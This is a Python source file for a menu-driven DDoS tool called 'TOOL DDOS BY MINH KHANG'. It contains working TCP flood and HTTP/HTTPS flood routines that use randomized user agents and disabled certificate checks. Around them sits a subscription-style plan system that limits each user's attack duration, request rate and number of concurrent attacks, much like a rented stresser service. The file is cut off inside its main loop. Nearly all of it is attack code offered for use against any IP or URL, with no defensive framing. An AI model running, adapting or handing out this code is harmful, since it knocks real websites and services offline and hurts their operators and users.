#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TOOL DDOS BY MINH KHANG
Version: 3.0
Author: Minh Khang
"""

import socket
import threading
import time
import random
import os
import sys
import urllib.parse

# ========== CONFIGURATION ==========
USER_DATABASE = {
    "root": "free",
    "6.4": "hard",
    "cry": "hard",
    "x2": "hard",
    "ddos": "ddos",
    "test": "free",
    "admin": "hard",
}

PLANS = {
    "free": {
        "methods": ["tcp", "http", "http-flood"],
        "max_time": 120,
        "max_rps": 100,
        "max_concurrent": 2,
    },
    "hard": {
        "methods": ["tcp", "http", "https", "http-flood", "https-flood", "syn"],
        "max_time": 300,
        "max_rps": 500,
        "max_concurrent": 10,
    },
    "ddos": {
        "methods": ["tcp", "http", "https", "http-flood", "https-flood", "syn", "udp"],
        "max_time": 600,
        "max_rps": 1000,
        "max_concurrent": 50,
    },
}

BOT_IPS = [
    "192.168.1.1", "192.168.1.2", "192.168.1.3", "192.168.1.4",
    "192.168.1.5", "192.168.1.6", "192.168.1.7", "192.168.1.8",
]

PROXY_LIST = [
    "proxy1.com:8080", "proxy2.com:3128", "proxy3.com:8080",
]

# ========== ATTACK MANAGER ==========
class DDoSAttackManager:
    def __init__(self):
        self.active_attacks = {}
        self.attack_counter = 0
        self.lock = threading.Lock()
        self.stats = {
            "total_requests": 0,
            "successful": 0,
            "failed": 0,
            "start_time": time.time()
        }
    
    def get_user_plan(self, username):
        """Get user's subscription plan"""
        return USER_DATABASE.get(username, "free")
    
    def validate_attack(self, username, method, duration, rps=0):
        """Validate if user can launch attack"""
        plan_name = self.get_user_plan(username)
        plan = PLANS.get(plan_name, PLANS["free"])
        
        # Check method
        if method not in plan["methods"]:
            return False, f"Method '{method}' not allowed for {plan_name} plan"
        
        # Check duration
        if duration > plan["max_time"]:
            return False, f"Max duration is {plan['max_time']} seconds"
        
        # Check RPS
        if rps > plan["max_rps"]:
            return False, f"Max RPS is {plan['max_rps']}"
        
        # Check concurrent attacks
        with self.lock:
            user_attacks = sum(1 for a in self.active_attacks.values() 
                              if a["username"] == username)
            if user_attacks >= plan["max_concurrent"]:
                return False, f"Max {plan['max_concurrent']} concurrent attacks"
        
        return True, "OK"
    
    def parse_target(self, target_input):
        """Parse target input (IP or URL)"""
        if not target_input:
            return None, None, None, "No target provided"
        
        # Check if it's a URL
        if "://" in target_input:
            try:
                parsed = urllib.parse.urlparse(target_input)
                if not parsed.scheme:
                    target_input = "http://" + target_input
                    parsed = urllib.parse.urlparse(target_input)
                
                host = parsed.hostname
                port = parsed.port or (443 if parsed.scheme == "https" else 80)
                is_https = (parsed.scheme == "https")
                return host, port, is_https, None
            except:
                return None, None, None, "Invalid URL format"
        else:
            # Assume it's IP:port or just IP
            if ":" in target_input:
                parts = target_input.split(":")
                host = parts[0]
                try:
                    port = int(parts[1])
                except:
                    port = 80
            else:
                host = target_input
                port = 80
            return host, port, False, None
    
    # ========== ATTACK METHODS ==========
    def tcp_flood(self, host, port, duration, attack_id):
        """TCP Flood attack"""
        print(f"[Attack #{attack_id}] Starting TCP Flood on {host}:{port}")
        
        end_time = time.time() + duration
        packet = random._urandom(1024)  # 1KB packet
        
        while time.time() < end_time and attack_id in self.active_attacks:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((host, port))
                
                for _ in range(100):  # Send 100 packets per connection
                    sock.send(packet)
                
                sock.close()
                with self.lock:
                    self.stats["successful"] += 1
                    self.stats["total_requests"] += 1
            except:
                with self.lock:
                    self.stats["failed"] += 1
                    self.stats["total_requests"] += 1
            
            time.sleep(0.01)  # Small delay
        
        self._cleanup_attack(attack_id)
    
    def http_flood(self, host, port, is_https, duration, rps, attack_id):
        """HTTP Flood attack with RPS control"""
        print(f"[Attack #{attack_id}] Starting HTTP{'S' if is_https else ''} Flood on {host}:{port}")
        print(f"[Attack #{attack_id}] RPS: {rps}, Duration: {duration}s")
        
        end_time = time.time() + duration
        request_count = 0
        
        # HTTP headers
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Linux x86_64)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
        ]
        
        paths = ["/", "/index.html", "/home", "/api/test", "/admin"]
        
        while time.time() < end_time and attack_id in self.active_attacks:
            try:
                # Create socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                
                if is_https:
                    import ssl
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=host)
                
                sock.connect((host, port))
                
                # Build HTTP request
                path = random.choice(paths)
                request_lines = [
                    f"GET {path} HTTP/1.1",
                    f"Host: {host}",
                    f"User-Agent: {random.choice(user_agents)}",
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language: en-US,en;q=0.5",
                    "Connection: keep-alive",
                    "\r\n"
                ]
                
                request = "\r\n".join(request_lines)
                sock.send(request.encode())
                
                # Try to receive response
                try:
                    sock.recv(1024)
                    with self.lock:
                        self.stats["successful"] += 1
                except:
                    with self.lock:
                        self.stats["failed"] += 1
                
                sock.close()
                request_count += 1
                
                with self.lock:
                    self.stats["total_requests"] += 1
                
                # Display progress
                elapsed = time.time() - (end_time - duration)
                if elapsed > 0:
                    current_rps = request_count / elapsed
                    print(f"\r[Attack #{attack_id}] Requests: {request_count} | "
                          f"Current RPS: {current_rps:.1f}", end="", flush=True)
                
            except Exception as e:
                with self.lock:
                    self.stats["failed"] += 1
                    self.stats["total_requests"] += 1
            
            # Control RPS
            if rps > 0:
                time.sleep(1.0 / rps)
        
        print(f"\n[Attack #{attack_id}] Completed! Total requests: {request_count}")
        self._cleanup_attack(attack_id)
    
    def _cleanup_attack(self, attack_id):
        """Clean up attack resources"""
        with self.lock:
            if attack_id in self.active_attacks:
                del self.active_attacks[attack_id]
    
    # ========== PUBLIC METHODS ==========
    def launch_attack(self, username, method, target, duration=60, rps=100):
        """Launch a new attack"""
        # Parse target
        host, port, is_https, error = self.parse_target(target)
        if error:
            return None, error
        
        # Validate attack
        can_attack, message = self.validate_attack(username, method, duration, rps)
        if not can_attack:
            return None, message
        
        # Create attack ID
        with self.lock:
            self.attack_counter += 1
            attack_id = self.attack_counter
            
            self.active_attacks[attack_id] = {
                "id": attack_id,
                "username": username,
                "method": method,
                "target": target,
                "host": host,
                "port": port,
                "duration": duration,
                "rps": rps,
                "start_time": time.time(),
                "thread": None,
            }
        
        # Start attack thread
        if method in ["http-flood", "https-flood"]:
            thread = threading.Thread(
                target=self.http_flood,
                args=(host, port, is_https, duration, rps, attack_id),
                daemon=True
            )
        elif method == "tcp":
            thread = threading.Thread(
                target=self.tcp_flood,
                args=(host, port, duration, attack_id),
                daemon=True
            )
        else:
            # Default to TCP flood
            thread = threading.Thread(
                target=self.tcp_flood,
                args=(host, port, duration, attack_id),
                daemon=True
            )
        
        self.active_attacks[attack_id]["thread"] = thread
        thread.start()
        
        return attack_id, f"Attack #{attack_id} started successfully!"
    
    def stop_attack(self, attack_id):
        """Stop a specific attack"""
        with self.lock:
            if attack_id in self.active_attacks:
                del self.active_attacks[attack_id]
                return True, f"Attack #{attack_id} stopped"
        return False, f"Attack #{attack_id} not found"
    
    def stop_all_attacks(self):
        """Stop all active attacks"""
        with self.lock:
            count = len(self.active_attacks)
            self.active_attacks.clear()
            return count
    
    def list_attacks(self):
        """List all active attacks"""
        with self.lock:
            attacks = list(self.active_attacks.values())
        
        if not attacks:
            return []
        
        result = []
        current_time = time.time()
        for attack in attacks:
            elapsed = current_time - attack["start_time"]
            remaining = max(0, attack["duration"] - elapsed)
            
            attack_info = {
                "id": attack["id"],
                "user": attack["username"],
                "method": attack["method"],
                "target": attack["target"],
                "rps": attack["rps"],
                "elapsed": f"{elapsed:.1f}s",
                "remaining": f"{remaining:.1f}s",
                "duration": f"{attack['duration']}s",
            }
            result.append(attack_info)
        
        return result
    
    def get_stats(self):
        """Get attack statistics"""
        with self.lock:
            stats = self.stats.copy()
            stats["active_attacks"] = len(self.active_attacks)
            stats["uptime"] = time.time() - stats["start_time"]
        
        return stats

# ========== USER INTERFACE ==========
class UserInterface:
    def __init__(self):
        self.manager = DDoSAttackManager()
        self.running = True
    
    def clear_screen(self):
        """Clear terminal screen"""
        os.system("cls" if os.name == "nt" else "clear")
    
    def display_banner(self):
        """Display tool banner"""
        self.clear_screen()
        print("=" * 60)
        print("TOOL DDOS BY MINH KHANG".center(60))
        print("Version 3.0 - Professional Edition".center(60))
        print("=" * 60)
        
        stats = self.manager.get_stats()
        print(f"Active Attacks: {stats['active_attacks']} | "
              f"Total Requests: {stats['total_requests']}")
        print(f"Successful: {stats['successful']} | "
              f"Failed: {stats['failed']}")
        print("=" * 60)
    
    def main_menu(self):
        """Display main menu"""
        print("\nMAIN MENU")
        print("1. Launch Attack")
        print("2. View Active Attacks")
        print("3. Stop Attack")
        print("4. Stop All Attacks")
        print("5. User Information")
        print("6. View Statistics")
        print("7. Exit")
        print("-" * 40)
        
        choice = input("Select option (1-7): ").strip()
        return choice
    
    def launch_attack_menu(self):
        """Launch attack menu"""
        print("\n" + "=" * 40)
        print("LAUNCH NEW ATTACK")
        print("=" * 40)
        
        # Username
        username = input("Username: ").strip()
        if not username:
            print("Username is required!")
            return
        
        plan_name = self.manager.get_user_plan(username)
        plan = PLANS.get(plan_name, PLANS["free"])
        
        print(f"\nUser: {username} | Plan: {plan_name}")
        print(f"Max Duration: {plan['max_time']}s | Max RPS: {plan['max_rps']}")
        print(f"Available Methods: {', '.join(plan['methods'])}")
        
        # Method
        print("\nSelect attack method:")
        for i, method in enumerate(plan["methods"], 1):
            print(f"{i}. {method}")
        
        try:
            method_idx = int(input(f"\nMethod (1-{len(plan['methods'])}): ")) - 1
            method = plan["methods"][method_idx]
        except:
            print("Invalid method selection!")
            return
        
        # Target
        print("\nEnter target:")
        print("Examples:")
        print("  - IP: 192.168.1.1")
        print("  - IP with port: 192.168.1.1:8080")
        print("  - URL: http://example.com")
        print("  - HTTPS URL: https://example.com")
        
        target = input("Target: ").strip()
        if not target:
            print("Target is required!")
            return
        
        # Duration
        try:
            duration = int(input(f"Duration in seconds (max {plan['max_time']}): ").strip())
            if duration > plan["max_time"]:
                print(f"Duration cannot exceed {plan['max_time']} seconds!")
                return
        except:
            print("Invalid duration!")
            return
        
        # RPS (for flood methods)
        rps = 0
        if method in ["http-flood", "https-flood"]:
            try:
                rps = int(input(f"Requests per second (max {plan['max_rps']}): ").strip())
                if rps > plan["max_rps"]:
                    print(f"RPS cannot exceed {plan['max_rps']}!")
                    return
            except:
                print("Invalid RPS!")
                return
        
        # Confirm
        print("\n" + "=" * 40)
        print("ATTACK SUMMARY")
        print("=" * 40)
        print(f"Username: {username}")
        print(f"Method: {method}")
        print(f"Target: {target}")
        print(f"Duration: {duration} seconds")
        if rps > 0:
            print(f"RPS: {rps}")
            print(f"Estimated total requests: {duration * rps}")
        print("=" * 40)
        
        confirm = input("\nLaunch attack? (y/n): ").strip().lower()
        if confirm != "y":
            print("Attack cancelled!")
            return
        
        # Launch attack
        attack_id, message = self.manager.launch_attack(
            username=username,
            method=method,
            target=target,
            duration=duration,
            rps=rps
        )
        
        print(f"\n{message}")
        if attack_id:
            print(f"Attack ID: {attack_id}")
            print("Use 'View Active Attacks' to monitor progress.")
    
    def view_attacks_menu(self):
        """View active attacks"""
        attacks = self.manager.list_attacks()
        
        if not attacks:
            print("\nNo active attacks.")
            return
        
        print(f"\nACTIVE ATTACKS ({len(attacks)})")
        print("=" * 80)
        print(f"{'ID':<5} {'User':<10} {'Method':<12} {'Target':<25} {'RPS':<8} {'Elapsed':<10} {'Remaining':<10}")
        print("=" * 80)
        
        for attack in attacks:
            target_display = attack["target"]
            if len(target_display) > 25:
                target_display = target_display[:22] + "..."
            
            rps_display = str(attack["rps"]) if attack["rps"] > 0 else "N/A"
            
            print(f"{attack['id']:<5} "
                  f"{attack['user']:<10} "
                  f"{attack['method']:<12} "
                  f"{target_display:<25} "
                  f"{rps_display:<8} "
                  f"{attack['elapsed']:<10} "
                  f"{attack['remaining']:<10}")
    
    def stop_attack_menu(self):
        """Stop specific attack"""
        try:
            attack_id = int(input("\nEnter Attack ID to stop: ").strip())
            success, message = self.manager.stop_attack(attack_id)
            print(message)
        except:
            print("Invalid Attack ID!")
    
    def user_info_menu(self):
        """Display user information"""
        username = input("\nEnter username: ").strip()
        if not username:
            return
        
        plan_name = self.manager.get_user_plan(username)
        plan = PLANS.get(plan_name, PLANS["free"])
        
        print(f"\nUSER INFORMATION")
        print("=" * 40)
        print(f"Username: {username}")
        print(f"Plan: {plan_name}")
        print(f"Max Duration: {plan['max_time']} seconds")
        print(f"Max RPS: {plan['max_rps']}")
        print(f"Max Concurrent Attacks: {plan['max_concurrent']}")
        print(f"Available Methods: {', '.join(plan['methods'])}")
        
        # Show active attacks for this user
        attacks = self.manager.list_attacks()
        user_attacks = [a for a in attacks if a["user"] == username]
        
        if user_attacks:
            print(f"\nActive Attacks: {len(user_attacks)}")
            for attack in user_attacks:
                print(f"  ID {attack['id']}: {attack['method']} -> {attack['target']}")
    
    def stats_menu(self):
        """Display statistics"""
        stats = self.manager.get_stats()
        
        print(f"\nSTATISTICS")
        print("=" * 40)
        print(f"Uptime: {stats['uptime']:.1f} seconds")
        print(f"Active Attacks: {stats['active_attacks']}")
        print(f"Total Requests: {stats['total_requests']}")
        print(f"Successful: {stats['successful']}")
        print(f"Failed: {stats['failed']}")
        
        if stats['total_requests'] > 0:
            success_rate = (stats['successful'] / stats['total_requests']) * 100
            print(f"Success Rate: {success_rate:.1f}%")
        
        # Calculate requests per second
        if stats['uptime'] > 0:
            rps = stats['total_requests'] / stats['uptime']
            print(f"Average RPS: {rps:.1f}")
    
    def run(self):
        """Main program loop"""
        while self.running:
            try:
              
